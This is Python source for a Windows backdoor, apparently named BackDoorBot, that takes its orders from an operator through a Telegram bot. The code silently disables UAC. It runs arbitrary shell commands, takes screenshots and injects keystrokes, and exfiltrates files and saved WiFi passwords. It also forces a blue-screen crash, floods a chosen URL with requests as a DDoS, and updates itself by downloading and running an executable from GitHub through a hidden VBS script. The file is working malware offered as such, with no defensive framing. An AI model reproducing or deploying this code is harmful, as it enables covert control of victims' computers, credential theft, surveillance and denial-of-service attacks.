# -*- coding: utf8 -*-
import ctypes
from datetime import datetime
import os
import platform
import subprocess
import requests
import wget
import pyautogui
import keyboard
import telebot
from cryptography.fernet import Fernet


name_file = "config" 

with open(name_file, 'rb') as file:
    data1 = file.read()

if len(data1.split()) > 1: # если не зашифрованный

    key = Fernet.generate_key() # генер ключа шифрования
    f = Fernet(key)
    encrypted_text = key[:22] + f.encrypt(data1) + key[-22:] 

    with open(name_file, 'wb') as file:
        file.write(encrypted_text)

else:

    with open(name_file, 'rb') as file:
        data2 = file.read()
    key = data2[:22] + data2[-22:] # чтение ключа
    f = Fernet(key)

with open(name_file, 'rb') as file:
        data3 = file.read()[22:-22]

decrypted_text = f.decrypt(data3).decode().split()

class Data: 
    name = decrypted_text[0]
    token = decrypted_text[1]
    id = [int(i) for i in decrypted_text[2][1:-1].split(',')] 
    update = int(decrypted_text[3])
    uic = int(decrypted_text[4])



class Logger_Bot:
    def __init__(self) -> None:
        self.path = 'logs\\'
        day = 3
        current, dirs, files = os.walk(self.path).__next__()
        if len(files) >= day:
            files = sorted(files)[:-3]
            for i in files:
                os.remove(self.path+i)

    def __save_log(self, text):
        path_log = self.path + 'log_' + datetime.now().strftime('%Y-%m-%d').replace(' ','_').replace(':','-')+".txt"
        arg = 'w'
        if os.path.exists(path_log):
            arg = 'a'
        with open(path_log, arg) as new_log:
            new_log.write(text+"\n")

    def log(self, name_func, e_text):
        time_e = datetime.now().strftime('%H:%M:%S').replace(' ','_').replace(':','-')
        text = f"[{time_e}] {name_func}: {e_text}."
        self.__save_log(text)



if not os.path.isdir('media'):
    os.mkdir('media')

id = Data.id

if Data.update == 1:
    os.remove('upd.vbs')
    os.remove('upd.bat')
    exit()

TOKEN_PC = [Data.name, Data.token]

bot = telebot.TeleBot(TOKEN_PC[1])
logger = Logger_Bot()

class Func_API:
    def __init__(self) -> None:
        self.NAME_PC = TOKEN_PC[0]
        self.tg_api = bot
        for ids in id:
            try:
                if ctypes.windll.shell32.IsUserAnAdmin():
                    bot.send_message(ids, f'{self.NAME_PC} запущен от имени администратора')

                    if not Data.uic: # Отрубает UAC
                        try:
                            command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
                            subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
                            subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            decrypted_text[4] = "1"
                            decrypted_text = " ".join(decrypted_text).encode('utf-8')
                            encrypted_text = key[:22] + f.encrypt(decrypted_text) + key[-22:]
  
                            with open('config', 'wb') as file:
                                file.write(encrypted_text) # изменение записи конфига об UIC

                        except Exception as e:
                                logger.log("disable_UAC",e)
                                bot.send_message(ids, f'🖥❌ \n{e}')

                else:
                    bot.send_message(
                        ids, f'{self.NAME_PC} запущен от имени обычного пользователя')

            except telebot.apihelper.ApiTelegramException:
                logger.log('__init__', 'Вы указали неверный токен')
                bot.stop_polling()

    def rasbiv(self, text): # нормализация и разбив на нужные значения
        texn = text.split()
        texc = text.split("{")[1:]
        for i in range(len(texc)):
            texc[i] = texc[i].split("}")[0]
        return {"name": texn[0],
                "cmnd": texn[1],
                "text": texc}

    def find_name(self, fig):
        lop = 0
        dir = os.listdir("media/")
        for i in dir:
            if i[:3] == fig:
                lop += 1
        return fig+str(lop)

    def ren(self, path, content):
        vb = self.find_name(content)
        if content == "vid":
            os.rename("media/"+path, "media/"+vb+".mp4")
        elif content == "pic":
            os.rename("media/"+path, "media/"+vb+".png")
        return vb

    def cmdo_ret(self, com): # нужно для работы ф-ции specifications
        try:
            res = subprocess.check_output(com, shell=1)
        except Exception as e:
            logger.log(self.cmdo_ret.__name__,e)
            return '🖥❌'

        try:
            res = res.decode('utf8')
        except Exception as e:
            try:
                res = res.decode('cp866')
            except Exception as e:
                return '🖥❌'
        return '🖥✅:\n'+res

    def cmdo(self, com): # output от выполнения команды в cmd
        try:
            res = subprocess.check_output(com, shell=1)
        except Exception as e:
            logger.log(self.cmdo.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')
        try:
            res = res.decode('utf8')
        except:
            try:
                res = res.decode('cp866')
            except Exception as e:
                logger.log(self.cmdo.__name__,e)
                bot.send_message(self.id, f'🖥❌ \n{e}')
        bot.send_message(self.id, '🖥✅:\n'+res)

    def cmdi(self, com): # выполнение команды в cmd
        try:
            os.system(com)
            bot.send_message(self.id, "🖥✅")
        except Exception as e:
            logger.log(self.cmdi.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def exits(self): # очищает папку с медиа
        dir = os.listdir("media/")
        for i in dir:
            os.remove("media/"+i)
        bot.send_message(self.id, "🖥✅")

    def ip_address(self):
        try:
            # Получение IP-адреса через jsonip.com
            ip = requests.get("http://jsonip.com/").json()
            # Получение информации об IP-адресе через ip-api.com
            response = requests.get(
                url=f'http://ip-api.com/json/{ip["ip"]}').json()

            # Создание словаря с информацией об IP-адресе
            data = {
                '[IP]': response.get('query'),
                '[Провайдер]': response.get('isp'),
                '[Организация]': response.get('org'),
                '[Страна]': response.get('country'),
                '[Регион]': response.get('regionName'),
                '[Город]': response.get('city'),
                '[ZIP]': response.get('zip'),
                '[Широта]': response.get('lat'),
                '[Долгота]': response.get('lon'),
            }

            # Формирование строки с информацией об IP-адресе
            info_string = ""
            for k, v in data.items():
                info_string += f'{k} : {v}\n'

            # Отправка строки с информацией об IP-адресе
            bot.send_message(self.id, info_string)
        except requests.exceptions.ConnectionError:
            logger.log(self.ip_address.__name__, 'Ошибка соединения')
            bot.send_message(self.id, 'Ошибка соединения')

    def wgt(self, text_comand): # скачивание файла по ссылке
        try:
            wget.download(text_comand[0], text_comand[1])
            bot.send_message(self.id, "🖥✅")
        except Exception as e:
            logger.log(self.wgt.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def rebooting(self, timer): # перезагрузка пк
        try:
            timer = "shutdown /r /t "+str(timer)
            os.system(timer)
            bot.send_message(self.id, "🖥✅")
        except Exception as e:
            logger.log(self.rebooting.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def shotdowning(self, timer): # выключение пк
        try:
            timer = "shutdown /s /t "+str(timer)
            os.system(timer)
            bot.send_message(self.id, "🖥✅")
        except Exception as e:
            logger.log(self.shotdowning.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def picture(self, file): # открытие картинки из папки с медиа
        try:
            command = f"media\\{file}.png"
            os.startfile(command)
            bot.send_message(self.id, "🖥✅")
        except Exception as e:
            logger.log(self.picture.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def video(self, file): # открытие видео из папки с медиа
        try:
            command = f"media\\{file}.mp4"
            os.startfile(command)
            bot.send_message(self.id, "🖥✅")
        except Exception as e:
            logger.log(self.video.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def specifications(self): # возвращает характеристики пк
        x, y = pyautogui.size()
        proc = self.cmdo_ret('powershell "Get-WmiObject -Class Win32_Processor | select Name"').split('\n')[4][:-2]
        ram = int(self.cmdo_ret('powershell "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum"').split("\n")[5].split(': ')[1][:-1])//1073741824
        vid = self.cmdo_ret('powershell "Get-WmiObject Win32_VideoController | select Name"').split('\n')[4][:-1]
        banner = f"""Name PC:   {platform.node()}
System:       {platform.system()} {platform.release()}
CPU:             {proc}
GPU:             {vid}
RAM:            {ram} GB
Screen:        {x}x{y}"""
        bot.send_message(self.id, banner)

    def rask(self): # меняет раскладку
        try:
            keyboard.press_and_release("alt+shift")
            bot.send_message(self.id, "🖥✅")
        except Exception as e:
            logger.log(self.specifications.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def screenshot(self): # скриншот и его отправка
        filename = f"screenshot_{datetime.now().strftime('%Y-%m-%d %H:%M:%S').replace(' ','_').replace(':','-')}.jpg"
        pyautogui.screenshot(filename)
        img = open(filename, "rb")
        bot.send_document(self.id, img)
        img.close()
        os.remove(filename)

    def keyb(self, text): # печать текста
        try:
            text = text.split("+")
            listing = ""
            button = ["shift", "alt", "f1", "f2", "f3", "f4", "f5", "f6", "f7",
                      "f8", "f9", "f10", "f11", "f12", "tab", "ctrl", "enter", "capslock"] # спец. клавиши
            for i in text:
                try:
                    index = button.index(i)
                    listing += i+"+"
                except Exception as e:
                    for kip in i:
                        listing += kip+"+"
            listing = listing[:-1].replace(' ', 'space')
            keyboard.press_and_release(listing)
            bot.send_message(self.id, "🖥✅")
        except Exception as e:
            logger.log(self.keyb.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def print_gui(self, text): # создаёт окно с текстом
        try:
            pyautogui.alert(text, "~")
            bot.send_message(self.id, '🖥✅')
        except Exception as e:
            logger.log(self.print_gui.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def input_gui(self, text): # создаёт окно с текстом и полем для ввода
        try:
            answer = pyautogui.prompt(text, "~")
            bot.send_message(self.id, answer)
        except Exception as e:
            logger.log(self.input_gui.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def closes(self): # закрывает открытое сейчас приложение
        try:
            keyboard.press_and_release("alt+f4")
            bot.send_message(self.id, '🖥✅')
        except Exception as e:
            logger.log(self.closes.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def start_file(self, path): # запускает файл по его path'у
        try:
            text = "start media/"+path
            os.system(text)
            bot.send_message(self.id, '🖥✅')
        except Exception as e:
            logger.log(self.start_file.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def direct(self, paths): # аналог команды tree с глубеной шага 1
        try:
            if paths == ".":
                paths = os.getcwd()
            exit_str = ""
            exit_str += f"{paths}: \n\n"
            current, dirs, files = os.walk(paths).__next__()
            for i in files:
                exit_str += i+"\n"
            for i in dirs:
                try:
                    o = os.listdir(paths+"/"+i)
                    exit_str += "|"+i+"\n"
                    for l in o:
                        exit_str += "| - "+l+"\n"
                    exit_str += "\n"
                except:
                    pass
            bot.send_message(self.id, exit_str)
        except Exception as e:
            logger.log(self.direct.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def update_bot(self):
        pth = os.getcwd()
        text_bat = f'''@echo off
timeout 30
del {pth}\\windows_shell.exe
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/main_bot/main.exe -OutFile windows_shell.exe"
start windows_shell.exe -n {TOKEN_PC[0]} -t {TOKEN_PC[1]} -u 1
exit'''

        text_vbs = f'''
set sh=CreateObject("Wscript.Shell")
sh.Run "{pth}\\upd.bat", 0''' # текст для скрипта обновы

        open('upd.bat', 'w').write(text_bat)
        open('upd.vbs', 'w').write(text_vbs)
        os.startfile('upd.vbs')
        bot.stop_polling() # остановка бота

    def ddos(self, url):
        # Устанавливаем headers Google бота, для обхода Cloudflare
        headers = {"User-Agent": "Google Bot"}

        if 'http' in url and '.' in url:
            # Отправляем сообщение о начале DDOS атаки
            bot.send_message(self.id, f'DDOS атака на {url} успешно запущена')
        else:
            bot.send_message(self.id, f'Ошибка: неверный url, проверьте правильность введенных данных')

        while True:
            try:
                # Отправляем GET запрос с данными
                requests.get(url, headers=headers,
                             allow_redirects=True, stream=True)
            except:
                pass

    def pull_file(self, path: str): # отправка файла с пк в тг
        path = path.replace('\\', '/')
        if os.path.exists(path):
            file = open(path, 'rb')
            bot.send_document(self.id, file)
        else:
            path = path.split('/')
            if len(path) <= 1:
                otv = f"🖥❌ File not found \n|{os.getcwd()}\n|--  " + \
                    '\n|--  '.join(os.listdir(os.getcwd()))
            else:
                pr = '/'.join(path[:-1])
                otv = f"🖥❌ File not found \n|{pr}\n|--  " + \
                    '\n|--  '.join(os.listdir(pr))
            bot.send_message(self.id, otv)

    def browser(self, link): # открытие ссылки в браузере
        try:
            linke = 'start ' + link
            os.system(linke)
            bot.send_message(self.id, '🖥✅')
        except Exception as e:
            logger.log(self.browser.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

    def extract_wifi_passwords(self): # камуниздинг паролей от wifi
        try:
            otv = ''
            profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')
            profiles = [i.split(':')[1].strip() for i in profiles_data if 'All User Profile' in i]
            
            for profile in profiles:
                profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode('utf-8').split('\n')

                try:
                    password = [i.split(':')[1].strip() for i in profile_info if 'Key Content' in i][0]
                except IndexError:
                    password = None
                otv += f'Profile: {profile}\nPassword: {password}\n{"#" * 20}\n'
            bot.send_message(self.id, f'🖥✅\n{otv}')
        except Exception as e:
            logger.log(self.extract_wifi_passwords.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')
    
    def bsod(self):
        nullptr = ctypes.POINTER(ctypes.c_int)()

        ctypes.windll.ntdll.RtlAdjustPrivilege(
            ctypes.c_uint(19),
            ctypes.c_uint(1),
            ctypes.c_uint(0),
            ctypes.byref(ctypes.c_int())
        )

        ctypes.windll.ntdll.NtRaiseHardError(
            ctypes.c_ulong(0xC000007B),
            ctypes.c_ulong(0),
            nullptr,
            nullptr,
            ctypes.c_uint(6),
            ctypes.byref(ctypes.c_uint())
        )

    def perfor(self, text, id_chat): # главный обработчик
        try:
            self.id = id_chat
            text = self.rasbiv(text)
            name_pc = text["name"]
            comnd = text["cmnd"]
            text_comand = text["text"] # преобразования

            if name_pc.lower() == self.NAME_PC or name_pc.lower() == "all": # выполнения команд
                if comnd == "wget":
                    self.wgt(text_comand)

                if comnd == "ip" or comnd == "ipad":
                    self.ip_address()

                if comnd == "reboot":
                    self.rebooting(text_comand[0])

                if comnd == "specifications" or comnd == "spec":
                    self.specifications()

                if comnd == "shotdown" or comnd == "shdn" or comnd == "vikl":
                    self.shotdowning(text_comand[0])

                if comnd == "picture" or comnd == "pict":
                    self.picture(text_comand[0])

                if comnd == "cmdi":
                    self.cmdi(text_comand[0])

                if comnd == "cmdo":
                    self.cmdo(text_comand[0])

                if comnd == "video" or comnd == "vide" or comnd == "vid":
                    self.video(text_comand[0])

                if comnd == "exit" or comnd == "cls" or comnd == "clear":
                    self.exits()

                if comnd == "lock" or comnd == "close":
                    self.closes()

                if comnd == "keyb" or comnd == "keyboard":
                    self.keyb(text_comand[0])

                if comnd == "rask" or comnd == "layout":
                    self.rask()

                if comnd == "dir" or comnd == "direction":
                    self.direct(text_comand[0])

                if comnd == "screenshot" or comnd == "scrn":
                    self.screenshot()

                if comnd == "inpt" or comnd == "input":
                    target = self.input_gui(text_comand[0])

                if comnd == "outp" or comnd == "output":
                    self.print_gui(text_comand[0])

                if comnd == "start" or comnd == "strt":
                    self.start_file(text_comand[0])

                if comnd == "ddos" or comnd == "attack_for":
                    self.ddos(text_comand[0])

                if comnd == "browser" or comnd == "brws":
                    self.browser(text_comand[0])

                if comnd == "pull" or comnd == "pull_file":
                    self.pull_file(text_comand[0])

                if comnd == "wifi" or comnd == "extract_wifi_passwords":
                    self.extract_wifi_passwords()
                
                if comnd == "bsod":
                    self.bsod()

                if comnd == "kill":
                    self.exits()
                    bot.stop_polling()

                if comnd == "upd":
                    self.update_bot()
        except:
            e = "Ошибка в ведённой команде"
            logger.log(self.rasbiv.__name__,e)
            bot.send_message(self.id, f'🖥❌ \n{e}')

        


func_api = Func_API()


@bot.message_handler(commands=['info', 'start'])
def start_message(message):
    if message.chat.id in id:
        bot.send_message(message.chat.id, "Список функций: \nhttps://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/documentation.txt")


@bot.message_handler(content_types=['text'])
def infokigb(message):
    if message.chat.id in id:
        func_api.perfor(message.text, message.chat.id)


@bot.message_handler(content_types=['photo'])
def handle_docs_document(message):
    if message.chat.id in id:
        file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = 'media/' + message.photo[1].file_id
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        picu = func_api.ren(message.photo[1].file_id, "pic")
        bot.reply_to(message, f"OK. Сохранил как {picu}\n")


@bot.message_handler(content_types=['video'])
def get_file(message):
    if message.chat.id in id:
        print(message.json)
        file_name = 'media/' + message.json['video']['file_id']
        file_info = bot.get_file(message.video.file_id)
        with open(file_name, "wb") as f:
            file_content = bot.download_file(file_info.file_path)
            f.write(file_content)
        video = func_api.ren(file_name[5:], "vid")
        bot.reply_to(message, f"OK. Сохранил как video")


@bot.message_handler(content_types=['document'])
def handle_file(message):
    if message.chat.id in id:
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            src = 'media/' + message.document.file_name
            with open(src, 'wb') as new_file:
                new_file.write(downloaded_file)
            bot.reply_to(message, "🖥✅")
        except Exception as e:
            logger.log('message_handler_doc',e)
            bot.reply_to(message, f"🖥❌\n{e}")


bot.infinity_polling() # запуск сканирования новых сообщений от тг
